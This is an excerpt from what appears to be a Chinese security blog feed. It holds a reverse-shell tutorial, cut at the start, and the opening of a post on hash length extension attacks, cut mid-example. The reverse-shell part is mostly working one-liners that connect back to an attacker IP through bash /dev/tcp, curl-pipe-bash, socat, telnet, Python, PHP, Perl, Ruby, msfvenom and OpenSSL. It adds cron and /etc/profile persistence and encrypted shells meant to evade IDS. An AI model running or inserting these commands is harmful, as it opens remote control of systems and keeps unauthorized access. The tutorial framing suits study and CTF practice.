class="line">#-e后面跟的参数代表的是在创建连接后执行的程序</span><br></pre></td></tr></table></figure><p>注： 要开端口</p><h2 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h2><p>将如下命令写入目标主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot; #更稳定</span><br><span class="line"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>其他shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p><p>以下是针对Bash反弹一句话进各个部分的说明：</p><table><thead><tr><th><strong>命令</strong></th><th><strong>命令详解</strong></th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境。</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令。</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td><td>Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table><p><strong>输入0是由&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong></p><p>然后攻击机在本地监听就可以了</p><h2 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a>Curl配合Bash反弹shell</h2><p>在目标机上执行 curl 攻击者web服务ip|bash，该 ip 的web服务目录里的 index 文件上含有 bash 一句话，就可以反弹shell。</p><p>首先，在攻击者自己的服务器 web 目录里面创建一个index文件（index.php或index.html），内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击者主机ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>开启2333端口的监听。(port)</p><p>然后再目标机上执行如下，即可反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 攻击者web服务ip|bash</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0777e9.png" alt="image-20240407194208309"></p><p>根据curl命令和Linux管道的作用，你不难理解这其中的原理。</p><p>Curl配合Bash反弹shell的方式在CTF题目中经常出现，curl IP|bash 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p><h2 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h2><p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见<a href="http://brieflyx.me/2015/linux-tools/socat-introduction/">这里</a></p><p>安装Socat的方法很简单：</p><blockquote><p>Ubuntu等可以直接使用 apt-get install socat 命令进行安装•也可以去官网下载<a href="http://www.dest-unreach.org/socat">源码包</a></p></blockquote><p>攻击机开启本地监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:<span class="number">2333</span> -或nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat tcp-connect:47.xxx.xxx.72:2333 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b05ab65.png" alt="image-20240407195514295"></p><h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>攻击机开启本地监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mknod a p; telnet <span class="number">47</span>.xxx.xxx.<span class="number">72</span> <span class="number">2333</span> <span class="number">0</span>&lt;a | /bin/bash <span class="number">1</span>&gt;a</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0625ba.png" alt="image-20240407195932242"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>攻击机需要开启两个本地监听：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line"></span><br><span class="line">nc -lvvp 4000</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0c7d3d.png" alt="image-20240407200107374"></p><p>如上图所示，获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</p><h2 id="脚本反弹shell"><a href="#脚本反弹shell" class="headerlink" title="脚本反弹shell"></a>脚本反弹shell</h2><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>攻击机开启本地监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b071159.png" alt="image-20240407200409152"></p><h3 id="php脚本"><a href="#php脚本" class="headerlink" title="php脚本"></a>php脚本</h3><p>当目标主机上有php环境时，我们可以用php来反弹shell。</p><p>攻击机开启本地监听：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);passthru(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="perl脚本"><a href="#perl脚本" class="headerlink" title="perl脚本"></a>perl脚本</h3><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p><p>攻击端开启端口监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444 </span><br></pre></td></tr></table></figure><p>目标主机脚本连接攻击机</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTE: Windows only</span><br><span class="line">perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b074baa.png" alt="image-20240407201033182"></p><h3 id="Ruby脚本"><a href="#Ruby脚本" class="headerlink" title="Ruby脚本"></a>Ruby脚本</h3><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p><p>攻击机开启本地监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,4242).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: <span class="subst">#&#123;<span class="variable">$_</span>&#125;</span>&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> Windows only</span></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9aff3303.png" alt="image-20240407201336569"></p><h2 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h2><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 msfvenom -l 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep &#x27;cmd/unix/reverse&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b116c69.png" alt="image-20240407202206782"></p><p>如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</span><br></pre></td></tr></table></figure><blockquote><p>-p 指定要使用的payload(攻击荷载)。<br>-f 指定输出格式</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a9b115960.png" alt="image-20240407202403110"></p><p>将生成的python反弹shell的一句话在目标主机上执行即可</p><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0edf68.png" alt="image-20240407202448000"></p><h2 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h3 id="OpenSSL-简介"><a href="#OpenSSL-简介" class="headerlink" title="OpenSSL 简介"></a>OpenSSL 简介</h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><blockquote><p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p></blockquote><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a9b088f2a.png" alt="image-20240407203949064"></p><h3 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h3><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</span><br></pre></td></tr></table></figure><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0af269.png" alt="image-20240407204322227"></p><p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="将反弹shell的命令写入定时任务"><a href="#将反弹shell的命令写入定时任务" class="headerlink" title="将反弹shell的命令写入定时任务"></a>将反弹shell的命令写入定时任务</h3><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;[crontabs]&#x2F; 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p><blockquote><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">*/<span class="number">1</span>  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/<span class="number">47</span>.xxx.xxx.<span class="number">72</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="comment">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span></span><br></pre></td></tr></table></figure><h3 id="将反弹shell命令写入-etc-profile文件"><a href="#将反弹shell命令写入-etc-profile文件" class="headerlink" title="将反弹shell命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell命令写入&#x2F;etc&#x2F;profile文件</h3><p>将以下反弹shell的命写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/<span class="number">47</span>.xxx.xxx.<span class="number">72</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> &amp;<span class="comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure><h3 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h3><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li><p>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</p></li><li><p>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</p></li><li><p>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p></li></ul><p><img src="https://bu.dusays.com/2024/05/13/6641a9b082dda.png" alt="image-20240407203253916"></p><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9afb6bae.png" alt="image-20240407203401749"></p><p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5长度拓展攻击</title>
      <link href="/2024/05/13/MD5%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2024/05/13/MD5%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Hash长度拓展攻击"><a href="#Hash长度拓展攻击" class="headerlink" title="Hash长度拓展攻击"></a>Hash长度拓展攻击</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>MD5是一种广泛使用的哈希函数，它产生一个128位（16字节）的哈希值。通常呈现为一个32字符的十六进制数。它是一种单项函数，这意味着从MD5哈希值是不可能（在实践中）直接得到原始数据的。换句话说，MD5不是加密过程；它是一个单向散列函数，没有一个反向的过程能够从散列值中恢复出准确的原始输入。</p><p>哈希长度扩展攻击（也称为哈希长度扩充攻击或者Hash Extension Attack）是一种针对使用Merkle-Damgard构造的哈希函数（如MD5, SHA-1, SHA-256）的加密攻击。Merkle-Damgard构造是一种创建哈希函数的方法，其典型结构包括一个基本的压缩函数和一个填充方案，确保输入数据的长度是特定倍数。</p><p>哈希长度扩展攻击的原理基于以下几点：</p><blockquote><p>可预见的填充： Merkle-Damgård实现使用一个预定义的方式来填充消息，以确保信息长度符合要求。通常填充以一个bit的’1’开始，然后是一串’0’，最后是一个表示原始消息长度的64位（对于MD5和SHA-1）或128位（对于某些SHA-2函数）的二进制数。攻击者知道这个填充方案。</p></blockquote><blockquote><p>状态保持： 哈希函数在处理信息的时候，会将信息分成固定大小的块，然后通过压缩函数逐块处理。每块处理结束后，压缩函数的输出会成为下一块处理的输入（称为”链式状态”或”中间哈希值”）。最终块处理完成后产生的输出便是整个消息的哈希值。</p></blockquote><blockquote><p>不需要初始状态： 在进行哈希计算时，攻击者并不需要知道原始消息的具体内容，只需知道原始消息哈希的中间状态或最终状态。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">想象一下，有一个秘密盒子（哈希函数），这个盒子可以把任何东西（数据）变成一堆乱码（哈希值），而且这个过程是单向的，就是说你不能从乱码再变回原来的东西。</span><br><span class="line"></span><br><span class="line">通常，当你把一些东西放进这个盒子时，如果想要让盒子正常工作，你需要在东西的后面放些填充物，比如棉花。这个填充过程是按照一定的规则来的，比如先放一点特别的棉花，再放一些普通的棉花，最后放一点标记原来东西大小的棉花。</span><br><span class="line"></span><br><span class="line">哈希长度扩展攻击就是有人发现了这个秘密：他们不需要知道你原来放进去的是什么，只要知道最后的乱码和你放进去东西的大小，他们就能在不打开盒子的情况下，在你的东西后面加上更多的东西和填充物，然后算出这个新组合的乱码。</span><br><span class="line"></span><br><span class="line">这样他们就能假装知道你最初放进去的东西，实际上他们只是在你的东西后面加了些自己的东西，然后算出了一个看起来合理的乱码。</span><br><span class="line"></span><br><span class="line">这种攻击之所以可行，是因为填充规则是公开的，而且这个秘密盒子在处理东西时有一些可以预测的特点。所以，如果别人知道你的乱码和你放进去东西的大小，他们就可能利用这些信息进行攻击。</span><br></pre></td></tr></table></figure><p>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。</p><p>如果一个应用程序是这样操作的：</p><ol><li>准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature&#x2F;签名）</li><li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文</li><li>服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</li></ol><p>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值<em>。</em></p><p>-——————————————————————-</p><blockquote><p>系统会自动生成一串任意的字节串secret，以及一串明文c1然后进行哈希加密，</p><p>m1&#x3D;hash(secret+c1)</p><p>我们可以得到加密后的密文m1，</p><p>然后我们需要提供一个密文m2，以及一串明文c2</p><p>使得</p><p>m2&#x3D;hash(secret+c2)</p><p>#一般来说，c1 in c2,c2实际上为c1的拓展部分，我们需要把明文的长度拓展一下，进行攻击</p><p>然后即可得到flag</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a9331bff9.png" alt="image-20240416201353405"></p><p><strong>分块</strong><br>哈希计算进行加密时，通常是将明文信息以类似块密码的形式进行分组，对各个组块依次加密，每一块一般为512 bit，也就是64 bytes，每组的明文部分为56 bytes，剩下的8 bytes表示这块明文消息未填充前的长度</p><p><strong>填充</strong><br>在明文消息的最后一块一般是不满足56ytes时就对这个最后一块进行padding填充，填充至56 bytes的位置，，填充方式为，在16进制下，我们需要在消息后添加一个80，然后加0，直至56 bytes时</p><p><strong>变量计算</strong><br>哈希加密的在分块之后，每块在进行加密运算之前都会有一个链变量(key)，有每一个链变量与该块进行运算，除了第一块，每一块相对应的链变量都是前一块进行哈希计算后的字符串生成的，也就是说，每一块都对下一块有影响，（有点类似于CBC了），而第一块会有一个初始的链变量，为（无需考虑计算过程的细节）</p><p>A&#x3D;0x67452301</p><p>B&#x3D;0xefcdab89<br>C&#x3D;0x98badcfe</p><p>D&#x3D;0x10325476</p><p>而最后一块生成的链变量需要进行高低位互换（如：aabbccdd -&gt; ddccbbaa），再拼接在一起就是我们计算出来的哈希值</p><p>代码验证：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;welcome&#125;&#x27;</span></span><br><span class="line">secrets=os.urandom(<span class="number">15</span>)</span><br><span class="line">m=<span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">k1=sha256(secrets+m+m).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(k1)</span><br><span class="line">key=<span class="built_in">input</span>(<span class="string">&quot;输入key的16进制&quot;</span>)</span><br><span class="line">cipher=<span class="built_in">input</span>(<span class="string">&quot;输入哈希值&quot;</span>)</span><br><span class="line">s1=secrets+m+<span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;经过多次尝试后发现，在python中，输入16进制字符串时对格式最友好的</span></span><br><span class="line"><span class="string">如果输入为类似\x00\x00\x00\x00\x00\x80的字符串，</span></span><br><span class="line"><span class="string">进行encode转为字节串会生成\\x00\\x00\\x00\\x00\\x00\\x80的错误形式</span></span><br><span class="line"><span class="string">即使转为urlcode在转回来的时候也会有误差，可能是我python环境的问题</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在使用hashpump时</span></span><br><span class="line"><span class="string">signnature：已知的hash加密的字符串</span></span><br><span class="line"><span class="string">data:hash加密字符串中明文中已知的部分</span></span><br><span class="line"><span class="string">key length: 未知的字符串长度</span></span><br><span class="line"><span class="string">add:自己想添加的附值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">k2=sha256(s1).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(k2)</span><br><span class="line"><span class="keyword">if</span> cipher==k2:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="工具梭哈"><a href="#工具梭哈" class="headerlink" title="工具梭哈"></a>工具梭哈</h2><p>当然，此攻击已经有很多成熟的工具了，不用再这么麻烦的自己写脚本跑。</p><p>这里使用<strong>hashump</strong>就行</p><h3 id="1、HashPump安装"><a href="#1、HashPump安装" class="headerlink" title="1、HashPump安装"></a><strong>1、HashPump安装</strong></h3><p>HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。</p><p>（至于别的文章提到了MD4、RIPEMD-160、SHA-0、WHIRLPOOL等也可以构造长度扩展攻击，等以后再研究。）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">不行就 git clone https://gitee.com/ljcppp/HashPump.git</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>至于想在python里实现hashpump，可以使用hashpumpy这个插件：</p><p>（注意还是得先安装了libssl-dev）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install hashpumpy</span><br></pre></td></tr></table></figure><p>推荐在linux里使用，使用方法可以这样获取：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line">&gt;&gt;&gt; import hashpumpy</span><br><span class="line">&gt;&gt;&gt; 